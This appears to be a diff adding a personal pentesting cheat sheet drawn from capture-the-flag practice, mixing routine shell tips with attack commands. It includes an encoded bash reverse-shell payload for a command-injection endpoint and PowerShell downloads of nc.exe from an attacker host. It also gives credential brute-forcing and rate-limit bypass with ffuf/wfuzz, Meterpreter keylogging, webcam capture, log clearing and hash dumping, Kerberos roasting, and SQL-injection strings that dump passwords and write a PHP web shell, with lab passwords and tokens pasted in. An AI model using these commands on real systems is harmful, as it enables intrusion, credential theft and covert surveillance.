@@ -1,0 +1,2635 @@
+
+
+#Important commands in future goal
+
+#find command 
+
+find --help
+find . -name pen.txt
+find /home -name pentest.txt
+find / -type f -name "*.txt"
+find . -type f -perm 0777 -print
+find /tmp -user pentest
+find /tmp -type f -name ".*"
+find /etc/ -readable -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+find / -perm -g=s -o -perm -u=s -type f 2>/dev/null
+find /home -writable -type d 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+find pentest -exec "whoami" \;
+find  / -name .*txt -exec  {} \;
+find /home -name "*.txt" -exec ls -l   {} \;
+                            
+
+# Best subdomain enumeration for website 
+
+dnsdumpster.com  # and put website name 
+
+https://dnsdumpster.com/static/map/tryhackme.com.png
+
+### dig is good for dns enumeration 
+
+dig pentestblog.in 
+
+dig pentestblog.in ns # nameserver 
+
+dig pentestblog.in mx # mail server 
+
+dig pentestblog.in txt # txt 
+
+dig pentestblog.in cname # cname
+
+dig pentestblog.in A # ipv4 
+
+dig pentestblog.in AAAA # ipv4 
+	
+dig @1.1.1.1 tryhackme.com MX
+
+dig -axfr pentestblog.in @192.168.43.198
+
+
+## nslooup information 
+
+you can use 1.1.1.1 for cloudflare and google 8.8.8.8 
+
+nslookup pentestblog.in  # get whole information about the target system 
+
+nslookup  -type=A pentestblog.in 
+
+nslookup -type=mx pentestblog.in 
+
+nslookup -type=ns pentestblog.in 
+
+nslookup -type=soa pentestblog.in 
+
+nslookup -type=txt pentestblog.in 
+
+nslookup -type=cname pentestblog.in 
+
+#but i love host command 
+
+# upgrade firefox 
+
+apt install --only-upgrade firefox
+
+# username and password both bruteforce 
+
+ffuf -w user.txt:W1,/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-10000.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.42.203/customers/login -fc 200
+
+
+## UserEnumeration Bruteforce Username
+
+ ffuf -w /usr/share/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.42.203/customers/signup -mr "username already exists"
+ wfuzz -c -X POST -u http://10.10.42.203/customers/signup  -d "username=FUZZ&email=pentestblog@gmail.com&password=Virat&cpassword=Virat" -w /usr/share/seclists/Usernames/Names/names.txt -H "Content-Type: application/x-www-form-urlencoded"  --hh 3713
+
+
+# How to find exact subdomain of website 
+
+ -site:www.google.com site:*.google.com
+
+
+# Enumrate website though favicon .ico 
+
+ #download favicon icon then use md5sum and paste https://wiki.owasp.org/index.php/OWASP_favicon_database 
+
+
+
+# read powershell txt file 
+
+# count all cmdlet only 
+ get-command | Where-Object -Property CommandType -eq Cmdlet | measure
+
+  Get-ChildItem -Path C:\ -Recurse -Filter "*interesting-file.txt*" -ErrorAction SilentlyContinue
+
+ get-location # find pwd 
+#file specific file 
+
+gci -Recurse | Where {$_.Name -match 'filenamehere'} | Select Fullname
+
+### this blog 
+ https://shellgeek.com/powershell-search-for-files/#:~:text=PowerShell%20find%20file%20using%20Get%2DChildItem,-Using%20PowerShell%20Get&text=The%20Get%2DChildItem%20cmdlet%20provides,number%20of%20levels%20to%20recurse.
+ get-content secrets.txt 
+
+#  Search Only Txt file inside windows sytem using posershell 
+
+ Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
+ 
+  # You can use load command in metasploit and load extra feature 
+
+load python ; then type help and see the last section 
+
+load kiwi ; this is mimicatz tool 
+
+########## Working with git command ############# 
+
+Quick setup — if you’ve done this kind of thing before
+or	
+https://github.com/sande3pyadav/Best-Meterpreter-Command.git
+Get started by creating a new file or uploading an existing file. We recommend every repository include a README, LICENSE, and .gitignore.
+
+…or create a new repository on the command line
+echo "# Best-Meterpreter-Command" >> README.md
+git init
+git add README.md
+git commit -m "first commit"
+git branch -M main
+git remote add origin https://github.com/sande3pyadav/Best-Meterpreter-Command.git
+git push -u origin main
+…or push an existing repository from the command line
+git remote add origin https://github.com/sande3pyadav/Best-Meterpreter-Command.git
+git branch -M main
+git push -u origin main
+…or import code from another repository
+You can initialize this repository with code from a Subversion, Mercurial, or TFS project.
+
+
+# meterpreter command
+
+Core commands
+background: Backgrounds the current session
+exit: Terminate the Meterpreter session
+guid: Get the session GUID (Globally Unique Identifier)
+help: Displays the help menu
+info: Displays information about a Post module
+irb: Opens an interactive Ruby shell on the current session
+load: Loads one or more Meterpreter extensions
+migrate: Allows you to migrate Meterpreter to another process
+run: Executes a Meterpreter script or Post module
+sessions: Quickly switch to another session
+File system commands
+
+cd: Will change directory
+ls: Will list files in the current directory (dir will also work)
+pwd: Prints the current working directory
+edit: will allow you to edit a file
+cat: Will show the contents of a file to the screen
+rm: Will delete the specified file
+search: Will search for files
+upload: Will upload a file or directory
+download: Will download a file or directory
+Networking commands
+
+arp: Displays the host ARP (Address Resolution Protocol) cache
+ifconfig: Displays network interfaces available on the target system
+netstat: Displays the network connections
+portfwd: Forwards a local port to a remote service
+route: Allows you to view and modify the routing table
+System commands
+
+clearev: Clears the event logs
+execute: Executes a command
+getpid: Shows the current process identifier
+getuid: Shows the user that Meterpreter is running as
+kill: Terminates a process
+pkill: Terminates processes by name
+ps: Lists running processes
+reboot: Reboots the remote computer
+shell: Drops into a system command shell
+shutdown: Shuts down the remote computer
+sysinfo: Gets information about the remote system, such as OS
+Others Commands (these will be listed under different menu categories in the help menu)
+
+idletime: Returns the number of seconds the remote user has been idle
+keyscan_dump: Dumps the keystroke buffer
+keyscan_start: Starts capturing keystrokes
+keyscan_stop: Stops capturing keystrokes
+screenshare: Allows you to watch the remote user's desktop in real time
+screenshot: Grabs a screenshot of the interactive desktop
+record_mic: Records audio from the default microphone for X seconds
+webcam_chat: Starts a video chat
+webcam_list: Lists webcams
+webcam_snap: Takes a snapshot from the specified webcam
+webcam_stream: Plays a video stream from the specified webcam
+getsystem: Attempts to elevate your privilege to that of local system
+hashdump: Dumps the contents of the SAM database
+
+# make bootable through kali linux 
+
+ sudo dd if=/path/to/windows.iso of=/dev/sdx bs=4M
+
+
+### recursive search in windows 
+
+ dir /s /b 
+
+# metasploit intrusint fact 
+
+ start database in metasploit 
+
+ systemctl start postgresql 
+
+ then star database 
+
+  msfdb init 
+
+ or 
+
+ scan port through metasploit then you can use few tips that you can successfull enumerate port on target system 
+
+ start metasploit with msf_db run  
+
+ then use db_nmap for port scanning this is same as nmap 
+
+ #######  workspace in metasploit ########## 
+
+ you can crate a new workspace in metasploit 
+
+ first time you login in metasploit there is no workspace . 
+
+ # to check workspace in metasploit 
+
+ workspace 
+
+# you can add another workspace 
+
+ workspace -a pentestblog 
+
+# you can delete workspace
+ 
+ workspace -d  pentestblog 
+
+analyze           Analyze database information about a specific address or address range
+db_connect        Connect to an existing data service
+db_disconnect     Disconnect from the current data service
+db_export         Export a file containing the contents of the database
+db_import         Import a scan result file (filetype will be auto-detected)
+db_nmap           Executes nmap and records the output automatically
+db_rebuild_cache  Rebuilds the database-stored module cache (deprecated)
+db_remove         Remove the saved data service entry
+db_save           Save the current data service connection as the default to reconnect on startup
+db_status         Show the current data service status
+hosts             List all hosts in the database
+loot              List all loot in the database
+notes             List all notes in the database
+services          List all services in the database
+vulns             List all vulnerabilities in the database
+workspace         Switch between database workspaces
+
+# msf command
+
+set payload 
+unset rhost 
+unset all # unset all payload 
+
+
+set # local variable 
+setg # global variable 
+
+unsetg # unset value 
+# How to genrate md5 hash 
+
+echo -n "pentestblog" | md5sum     
+
+## best Listner from our side 
+
+ rlwrap nc -nvlp 9001 
+
+
+## Downlaod file through powershell 
+
+Invoke-WebRequest -URI http://10.10.14.3/windows.exe -OutFile C:\Users\Pentestblog\windows.exe
+
+
+(New-Object System.Net.WebClient).DownloadFile (http://10.10.14.3/windows.exe, C:\Users\Pentestblog\windows.exe)
+
+
+# File Transfer through smbserver 
+
+
+smbserver.py  kali .  -smb2support >>> this is on linux server 
+copy \\192.168.43.198\kali\text.exe .   # on windows server there dot (.) show the current path of foler 
+
+# list all file inside kali using smbserver 
+
+ dir \\192.168.43.198\kali\  # then it will show all file 
+
+## File transfer to smbserver smb2support 
+
+
+# how to connect xrdp 
+xfreerdp /u:"thm-unpriv" /v:10.10.135.167 /p:Password321
+
+# touch pad after without clicking touchpad 
+synclient tapbutton1=1
+
+
+# how to enumerte active directory using kerbrute 
+
+ kerbrute userenum --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL  user.txt 
+
+ # after find username let's file tgt key 
+
+  GetNPUsers.py -dc-ip 10.10.199.28 spookysec.local/ -usersfile use -format john -outputfile love
+
+  GetNPUsers.py -dc-ip 10.10.199.28 spookysec.local/ -usersfile use -format hashcat -outputfile loves  # hashcat 
+
+# grep command regular expresstion 
+
+
+    [ ]: Matches any one of a set characters
+    [ ] with hyphen: Matches any one of a range characters
+    ^: The pattern following it must occur at the beginning of each line
+    ^ with [ ] : The pattern must not contain any character in the set specified
+    $: The pattern preceding it must occur at the end of each line
+    . (dot): Matches any one character
+    \ (backslash): Ignores the special meaning of the character following it
+    *: zero or more occurrences of the previous character
+    (dot).*: Nothing or any numbers of characters.
+
+
+
+ ps -aux  | grep root  | grep  -v  [91] ::: this is not show 91 or we can use [0-9]
+ 
+ use . 
+   
+ grep "..vik" file.txt
+
+ ps -aux  | grep root  | awk -F " " {'print $11'} | grep ^/
+ 
+
+ # how to search kernal expliot in linux 
+
+  uname -a : copy current verison 5.4.0
+
+  searchspliot linux kernel 5.4.0 
+
+
+# how set and paste working in linux 
+
+ select text using Alt + w 
+
+ open vim and type :set paste use paste using ctrl + alt + } 
+
+
+# Important Note 
+
+/proc/self/cmdline :  store app name example:
+
+ /usr/local/bin/uwsgi--socketlocalhost:8000--protocol=http-wwsgi:app--workers100
+
+ ::: there is wwsgi:app ok this app.py ok app say file name app.py and running on 8000 port 
+
+/proc/self/environ 
+
+   HOME=/home/codeLOGNAME=codeUSER=codeSHELL=/bin/bashINVOCATION_ID=565b85c7c8bf483fa278e39026136a7cJOURNAL_STREAM=9:34278
+
+  ::: there is HOME right : it means /home/code # is /home/pentestblog username where app.py is store 
+   Username: code 
+
+ I know my current file name is app.py which mention on /proc/self/cmdline ok 
+
+ let's exlore current file  of application full 
+
+ /proc/self/cwd/app.py
+ 
+
+if you want to know full path then you check nginx or apache default setup 
+
+
+# remotly login in mysql 
+ 
+ mysql -u root -p  -h 10.10.10.10
+ 
+
+
+# Get exponent and modulus given a public key
+
+openssl rsa -text -noout -in private.key # give exponent 
+
+openssl rsa -text -noout -in private.key -modulus # give modulus 
+
+# Generate Rsa public key for jwt 
+
+ ssk-keygen -t rsa -m PEM -b 2048 -f jwt.key 
+
+# Encrypt rsa with openssl 
+
+ openssl rsa -in jwt.key -pubout -out jwt.key.pub 
+
+# covert 010001 to AQAB From hex to base64 using cyberchef  
+ 
+ echo 010001 | xxd -r -ps | base64
+
+# jku 
+
+ 1) openssl rsa -text -noout -in private.key -modulus
+
+ 2) echo modules | xxd -r -p | base64 
+
+ 3) paste it n: part jku
+
+
+|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| Windows Databse "  """| ||||||||||||||||||||||||||||||||
+
+# file transfer powershell 
+
+# on kali 
+
+ python3 -m http.server 80 
+
+#on windows 
+
+ (new-object System.Net.WebClient).DownloadFile('http://10.9.234.44/nc.exe','C:\Users\Administrator\Downloads\nc.exe')
+
+
+
+
+# nmap 
+
+ tcp syn scan # where we scan port with 3 way handshake # but tcp syn scan etablish half connection 
+ 
+
+ if server send rst packet then port is closed if server is send ACK packet then port is open 
+ if server does not send any packet then firewall active and blocking us 
+
+ # tcp syn scan on --top-ports 20 
+
+ sudo nmap -sS  -v --top-port 20 pentestblog.in
+
+ # tcp connection scan 
+
+ in tcp connect scan is take more time because it etablish complete 3 way handshake. 
+
+ nmap -sT -v --top-port 20 pentestblog.in 
+
+
+ """""""""""""""""""""""""""""
+
+└─$  sudo  nmap -sT  --top-port 5 pentestblog.in 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 12:12 IST
+Nmap scan report for pentestblog.in (5.181.218.135)
+Host is up (0.47s latency).
+Other addresses for pentestblog.in (not scanned): 2a02:4780:1:495:0:25ba:56ee:1
+
+PORT    STATE    SERVICE
+21/tcp  open     ftp
+22/tcp  closed   ssh
+23/tcp  filtered telnet
+80/tcp  open     http
+443/tcp open     https
+
+Nmap done: 1 IP address (1 host up) scanned in 4.70 seconds
+                                                                                                                                                    
+┌──(pentestblog__Pentestblog)-[~/_/Boxes/Linux/Reagain-practice/monitors]
+└─$  sudo  nmap -sS  --top-port 5 pentestblog.in 
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-05 12:12 IST
+Nmap scan report for pentestblog.in (5.181.218.135)
+Host is up (0.37s latency).
+Other addresses for pentestblog.in (not scanned): 2a02:4780:1:495:0:25ba:56ee:1
+
+PORT    STATE    SERVICE
+21/tcp  open     ftp
+22/tcp  closed   ssh
+23/tcp  filtered telnet
+80/tcp  open     http
+443/tcp open     https
+
+Nmap done: 1 IP address (1 host up) scanned in 3.83 seconds
+"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
+
+# -sn using 
+
+  -sn is using to find host is up or down
+   it is not scanning port of target server 
+
+ nmap -sn --top-port 10 pentestblog.in 
+ nmap -sn 192.168.43.1/24  # you can use this complex network scanning 
+
+ nmap -Pn 192.168.43.1/24 # disable ping it is bad but you can not use largest network but more time using firewall because most 
+ server block ping request 
+
+ # -sA ack scanning 
+
+  it receive ack if ack not receive then return port is filter 
+
+# note from nano 
+
+you can use ctrl + k to cut and ctrl + u to paste 
+
+alt + u undo and ctrl + shift + arrow TO select text 
+
+
+# change mac address 
+
+macchanger --random wlan0 # set random mac address 
+
+# set custome mac 
+
+macchanger -m type mac wlan0
+
+# login public and private through evil-winrm tool 
+
+ evil-winrm -i timelapse.htb -S -k priv-key.pem -c certificate.pem 
+
+# login with username and password 
+
+  evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'  -S
+
+# pfx file is which pkcs#12 format contain ssl certificate (private key and public key ) 
+ 
+ https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/ # best website for reading pfx file 
+  
+ # extract private key  pfx file 
+
+  openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes  
+
+ # extract certificate pfx file 
+
+  openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem 
+
+ # Crack pfx password 
+
+ pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth.pfx.hash 
+
+# hacking and how to scan whole network using nmap 
+
+nmap -Pn --open   192.168.43.1-254 -p 139,445  --min-rate 1000
+
+# very good command repclate _ with . 
+
+cat n.txt| tr "_" "."
+
+# Important Note for find command 
+
+ check last 20 minute modify file 
+
+	find / -user pentestblog  -amin -20 -type f -exec ls -l {} \; 2>/dev/null # last 20 min ago 
+	find / -user pentestblog  -mtime -7 -type f -exec ls -l {} \; 2>/dev/null # last weak  min age 
+	find / -user pentestblog  -mmin -60 -type f -exec ls -l {} \; 2>/dev/null  # last 60 minute
+	find / -user pentestblog  +amin 20 -type f -exec ls -l {} \; 2>/dev/null  # later 20 minute 
+
+# check file modification and write and access 
+
+ stat   /home/amrois/.ssh/authorized_keys 
+
+#Bypass waf 
+
+https://jlajara.gitlab.io/Bypass_WAF_Unicode
+
+
+
+for x in "/usr/local/sbin /usr/local/bin /usr/sbin /usr/bin /sbin /bin" ; do ls -la --time-style=full $x  |grep -v 000000000;done | grep -v 'l'
+
+
+# notes
+
+allow_url_fopen :: on ?? you can open external rfi link 
+
+allow_url_include :: on ?? you can include txt or php file # these types of born lfi or directory traversal bug  
+
+
+# dump password inside sam aur system file 
+
+ impacket-secretsdump  -sam SAM -system SYSTEM local
+
+
+## mysql not working during tty not corretly get data 
+ 
+ if mysql -u root -p :: not working then you can use this command 
+
+ 
+mysql -e 'show tables;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
+mysql -e 'select * from users \G;' -u drupaluser -p'CQHEy@9M*m23gBVj' drupal
+
+
+# Best Port scanning on any network # hacking firest  
+
+ sudo nmap  pentestblog.in -v -Pn --top-ports 10
+
+
+# How to mount and read vhd file in linux 
+
+ guestmount --add <file>  --inspector --ro -v /tmp/vhd
+
+ guestmount --add 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro -v ../../../../guest 
+
+# open your mind read any file through 7z 
+
+ 7z is more powerfull tool which is used to read file 
+
+ 7z l file.tz
+
+# du command usage 
+
+du /home/pentestblog/file   # check file size but not human readble 
+
+du -h  /home/pentestblog/file # this is human reable 
+
+# get total size of disk 
+
+ du -hs  /home/pentestblog/file  
+
+ du  -ah file.txt  # display all txt file 
+
+  du -ha --time /home/tecmint
+
+# smblogin with hash 
+
+
+smbmap -H 10.10.10.134 -u 'L4mpje' -p 'aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9'
+
+#there are some intrusting in smb 
+
+
+
+smb: \WindowsImageBackup\> dir
+  .                                  Dn        0  Fri Feb 22 18:14:02 2019
+  ..                                 Dn        0  Fri Feb 22 18:14:02 2019
+  L4mpje-PC                          Dn        0  Fri Feb 22 18:15:32 2019
+
+                5638911 blocks of size 4096. 1172164 blocks available
+
+# DN mean this is diretory 
+
+A mean is file 
+
+
+### New change on sed command 
+
+ ┌──(pentestblog__Pentestblog)-[~/_/Boxes/Windows/easy/bastion]
+└─$ cat nmap/all-port.nmap | grep "open" | awk -F / {'print $1'} | sed -z 's/\n/,/g'
+22,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669,49670,                                                                                                                                                    
+
+
+
+## DOwnload powershell file one liner 
+
+ (New-Object System.Net.WebClient).DownloadFile("https://example.com/archive.zip", "C:\Windows\Temp\archive.zip")  
+ 
+## always we say find something intrusting on daily bases in linux server 
+
+CUPS 1.6.1 # this is cups version ok we used it through chisel antique box ok 
+
+# why we should check copyright 
+
+  there are one option we check copywirte process because we can easily find exploit 
+
+  copy@ 2007 2021  #means you have only search 7 to 21 exploit on google this is best part of hacking 
+
+
+#  Some Note during the pentesting i have captured 
+
+if you found some intresting port inside reverse shell then if ssh is not working then try to working 
+
+ nc -zv ip port 
+
+# snmp enumeration 
+
+snmpbulkwalk -c public -v2c 10.10.11.107   .
+
+snmpwalk -c public -v2c 10.10.11.107 
+
+# new grep command 
+
+grep . # remove space line by line 
+
+#telnet pentesting 
+
+telnet ip 23 
+
+vrfy root # verify root user 
+
+bruteforce on telnet 
+
+
+# important credential for hacker 
+
+ check file last modified date using exiftool 
+
+ after that search vulnerbility on google using last modified date and current date 
+
+
+# exiftool bug in image 
+
+ exiftool -config eval.config runme.jpg -eval='system("ls -la")'
+ exiftool -comment="hello" img.jpg
+ exitool -comment="<b> hello</b>" imag.jpg > add xs
+
+ # magic byte 
+
+ head -c 20 file.jpg | xxd 
+
+ head -c 20 file.jpg > new
+
+ cat new shell.sh > mew.php 
+
+
+# dump all database 
+
+mysqldump --user root --password --all-databases > all-databases.sql.
+# check all open port in linux 
+
+for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
+
+for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
+
+# decode cookie using flask 
+
+flask-unsign --decode --cookie '.eJwlzj1TMqTTnYMQYgHMz_vz_z6A9RA8RllaMBmUsvSRIRpXCbUwdNG-30Bz08-NA.Yq2PCQ.Uaq_dMyXgouMci7fq82ueldKW5I'
+
+# encode 
+ 
+flask-unsign --sign --cookie "{'_fresh': True, '_id': 'f1a3dbae3cd74812530e', '_user_id': '1', 'csrf_token': '4329f6142807e69'}" --secret S3cr3t_K#Key
+
+
+# bypass sql login page 
+
+         email=new@gmail.com'+OR+1=1+Limit+1--+&password=hacker
+	 email=new@gmail.com'+OR+1=1--+&password=hacker
+
+
+#### open your mind and find website backend using source code 
+
+# if you find out 
+  /static/images/ then it is made on flask or python 
+
+ /assest/ then php # different website may be  
+
+  
+
+
+## import find command 
+
+ find / -type f -group matt -perm -g=x -print 2>/dev/null
+
+
+# snmp enumeration using snmp walk 
+
+onesixtyone -c public 10.10.11.136 
+
+snmpwalk -c public -v1 10.10.11.136  
+
+
+####### best snmp enumeration using snmpwalk 
+
+snmpbulkwalk -c public -v2c 10.10.11.136  
+
+# Dangerous Capabilities 
+cap_sys_module, cap_sys_ptrace, cap_sys_admin are capabilities which attacker can easily use to breakout container.
+
+    CAP_CHOWN
+    CAP_DAC_OVERRIDE
+    CAP_DAC_READ_SEARCH
+    CAP_SETUID
+    CAP_SETGID
+    CAP_NET_RAW
+    CAP_SYS_ADMIN
+    CAP_SYS_PTRACE
+    CAP_SYS_MODULE
+    CAP_FORMER
+    CAP_SETFCAP
+
+# show only relevant file 
+
+echo H*
+
+######### best command for lfi 
+
+# process enumeration 
+
+for x in $(seq 0 3000); do echo -n "$x::  " ; python3 exploit-arg.py /proc/$x/cmdline ; echo ; done |tee  process.log
+
+# /etc/file enumeration 
+
+for x in $(cat lfi-best-latest-new); do echo "#############\n$x\n###############"; python3 exploit.py $x ; echo ; done  | tee log.file
+
+
+
+
+## How to scan wifi network using command line 
+
+iwlist wlan0 scan 
+
+# Connect wifi Network 
+
+
+  nmcli dev wifi connect Sandeep password viratkohli
+
+  nmclie dev status 
+
+ 
+
+
+## get reverse using url encoded techniq 
+
+
+GET /api/v1/admin/exec/e%63%68%6f%20%22%59%6d%46%7a%61%43%41%67%4c%57%6b%67%49%44%34%6d%49%43%39%6b%5a%58%59%76%64%47%4e%77%4c%7a%45%77%4c%6a%45%77%4c%6a%45%30%4c%6a%4d%76%4f%54%41%77%4d%53%41%77%50%69%59%78%49%43%41%4b%22%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68 HTTP/1.1
+Host: 10.10.11.161
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.11.161/docs
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoiYWNjZXNzX3Rva2VuIiwiZXhwIjoxNjUzMzkyMDAzLCJpYXQiOjE2NTI3MDA4MDMsInN1YiI6IjEiLCJkZWJ1ZyI6dHJ1ZSwiaXNfc3VwZXJ1c2VyIjp0cnVlLCJndWlkIjoiMzZjMmU5NGEtNDI3MS00MjU5LTkzYmYtYzk2YWQ1OTQ4Mjg0In0.lDmG-U7t1jHFNmg8S4s6esz2iM-ohmhOTXse0E8HKHQ
+DNT: 1
+Connection: close
+
+
+
+# file inclusion 
+
+for x in $(cat linux.txt); do echo "##$x##"; python3 new.py $x | grep -v "Internal Server Error"  ; done  
+
+
+#  #  BEst reverse shell 
+
+
+%65%63%68%6f%20%22%59%6d%46%7a%61%43%41%67%4c%57%6b%67%49%44%34%6d%49%43%39%6b%5a%58%59%76%64%47%4e%77%4c%7a%45%77%4c%6a%45%77%4c%6a%45%30%4c%6a%49%76%4f%54%41%77%4d%53%41%77%50%69%59%78%49%43%41%4b%22%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68
+
+
+
+
+######3 Some tips 
+
+^@\
+^@from app.schemas.user import User\
+^@from app.api.v1.api import api_router\
+^@from app.core.config import settings\
+
+## there is app folder inside core folder config.py file 
+
+
+
+
+#######  New Pentesting Techniq ::: 
+
+lfi: through find what is file name main.py 
+
+cat /proc/self/cmdline  /proc/self/environ /proc/sefl/maps /proc/self/cwd 
+
+## this is very important file 
+
+  find out using /proc/self/cmdline:   check current path where web application is store;
+  
+/proc/self/cwd
+/proc/self/environ
+/proc/self/maps
+
+
+
+########## During the pentesting always keep in mind 
+
+you can use wfuzz tool for bruteforce attack :::: 
+
+
+you can use post or get method because ::: wfuzz is good tool for whitelist and blacklist 
+
+
+#### Dump all databaase using commadline 
+
+mysql -u root -p database > uhc.sql
+
+
+
+
+################# Best sql injection union based cheat sheet ##########################
+
+
+#################  Fetch all database informaiotn #####################
+
+# list database_name 
+
+'union+select+group_concat(schema_name)+from+information_schema.schemata--+       
+
+# list all table and column Name 
+
+‘union+select+group_concat(concat(’\n', table_name, ‘:’, column_name))+from+information_schema.columns+where+table_schema='users'--+ 
+
+
+# list all username and password
+
+‘union+select+group_concat(concat(’\n', username, ‘:’, password))+from+users--+
+
+
+
+# read file on server	
+	
+‘union+select+load_file(’/etc/passwd')--+
+
+
+
+# write shell on server	
+	
+'union+select+'<?php+system($_REQUEST[pen]);?>'+into+outfile+'/var/www/html/pen.php'--+
+	
+
+########################################################################################
+
+
+# process enumeration all in linux 
+
+ for i in  $(seq 0 3000); do echo -n "$i:"; curl -s  http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/$i/cmdline  --output - | cut -d "<" -f1  | sed 's/cmdline/\t/g'; echo ; done | tee proc.log
+
+
+#you are idiot always open your mind 
+
+
+
+ "" During the pentesting if you see about lfi pentesting then you can use fuzzing inside linux lfi 
+
+/usr/share/seclist/fuzzing/lfi 
+
+
+
+# How to check file size in linux 
+
+ du -su file.txt
+
+
+# how to detect sql injection 
+ 
+
+
+  """""""""""
+
+ # This is entry point sql injection always test any website
+
+ 
+##################### url encode form###############
+'  == %27
+"  == %22
+#  == %23
+;  == %3B
+)  == %29
+'-- - == %27%2d%2d%20%2d
+'--+-- 
+'--+-
+--+ 
+
+
+
+
+# if id parameter then 
+
+
+ don't use any 
+
+ ' " \ # ; only test 
+
+ use -- --+ --+- this query to balace .. 
+
+
+## 
+
+ Some Login Here 
+
+ After Controlling Sql error 
+
+ # check table in web app 
+
+  order by 1,2,3 
+
+ # another check 
+ 
+  union select 1,2,3,4 
+
+ # check good path 
+
+
+  you can put wrong id 
+
+  {"id":"23 union select 1,2,3--","secret":true}
+
+
+ # keep in mind if id parameter is available then put wrong id
+
+
+
+# grep system information 
+
+  
+{"id":"233 union select 1,2,user()--","secret":true}
+
+
+{"id":"233 union select 1,2,@@version--","secret":true}
+
+{"id":"233 union select 1,2,database()--","secret":true}
+
+@@hostname
+
+
+
+#### How to find table columns and id password 
+
+# table enumreation 
+union select 1,2,table_name FROM information_schema.tables--
+
+
+# columns enumeration 
+
+union select 1,2,column_name FROM information_schema.columns where table_name='users'
+
+# concat quary is used to extract information name username and password:
+
+ union select 1,2,concat(user,password) FROM users; 
+
+
+###### Another way to find user name and password 
+
+#################   group_concat() is used to concat multiple rows in one field
+
+### schema_name is used to find out what is using mysql or another sql server 
+
+#union select 1,2,group_concat()
+
+# 
+  union select 1,2,schema_name from information_schema.schemata-- # show all table in list 
+
+
+# 
+  union select 1,2,group_concat(schema_name) from information_schema.schemata-- # show all table in oneline
+
+
+#
+  union select 1,2,group_concat(concat(column_name)) from information_schema.columns where table_schema='uhc'--  #show all columns in list
+
+
+#  
+   union select 1,2,group_concat(concat(name,password)) from uhc.users-- 
+
+"""""""""""""""""""""""""
+
+
+ alwasy test these code simple and url encode with all character 
+
+ , #,',",\,;,) : if these work then balace sql injection 
+  --, --+, --+- --+---  
+
+ Type: subversion application logic  play with OR And 
+
+ 1 = 1 True : And Working passowrd on these queary 
+
+ 1 = 0 True  : OR using to bypass and subverting sql injection . 
+
+ During Pentesting always keep in mind Remember id or other parameter
+
+# double single ' quote 
+
+  Always check double single '' to test server using ' ' in server 
+
+  select * from users where username=$user and password=$pass;
+
+  # this is not using single quote then putting single quote generate an error.
+  
+   # you can thing after putting double single ' ' if error is not going then server use only id parameter .
+
+   select * from users where userid=$id
+  
+   # In this case we can'not put any ' or " \ # ; beacause it use int 
+
+
+
+# BYPASS X RATE limit wfuzz code:
+
+  wfuzz -c -u http://10.10.11.159/api/resettoken -H "Cookie: XSRF-TOKEN=eyJpdiI6IjlCZ0ZQemMvMDQ5N2ZxUGxxSDZzR0E9PSIsInZhbHVlIjoiUS9Ed2g4MkJ4WHFVNW9CcTdwSkdWWG01WXhFei9FS0dZWWhQU3JuRW1qdnBrVDBiWTVmMTZ4b3Q2cHFJbnFCWnlXNVdTS3M1cWc3bEF4cjYxMlR1ejJ0aDR4cUZWWml5TUttVzRoWHlKWGZ2UDg5eXZtbnFHdTZmdTMxTGtqb0UiLCJtYWMiOiI5YmUxZTRkOTVjMzFkZTM3YmQ3MWY0YjhiNDJmMzg3Mzc0ZTg2YzhlYjYxZjUyNDEzYjdiYmNlZTg1YWVhMzQ4IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImxpYmJHMEhUeDlQSjIwL1lSTUZueFE9PSIsInZhbHVlIjoiVW9kWW82SkJkNURZNy93aWNET2JGMXBjZzNJcXdGQXRUMkxMTWhyY0pLeE1EUmpSbDd4VS9oRUxQb21wczBzRklPQTFyVjE3YnJZajJ4dnJJVjFHMkRaSGYxY3JlV3hvR2xtekVIbERTZ1ZRSzRMbWxZeHhSQklLM2hkUmRqSksiLCJtYWMiOiI0NTVhNTFkY2U5OTNkZThjMzIyY2FjODI3MWY2YWFmNTgzZDc2NmFkY2RlYjExMmU1NDM3M2E0YzJjMTI2NmIxIiwidGFnIjoiIn0%3D" -d "name=admin&pin=FUZZ" -H "Content-Type: application/x-www-form-urlencoded" -z range,1000-9999 -H "X-Forwarded-For: 127.0.0.FUZ2Z" -m zip -w number --hh 5644
+
+  -z is using to range -z range,1000-9999 -m zip 
+   
+   use multiple parameter bruteforce using wfuzz: fuz2z 
+   
+
+
+
+# UDP Port Scanning 
+
+ nmap -sU -top-ports=20
+
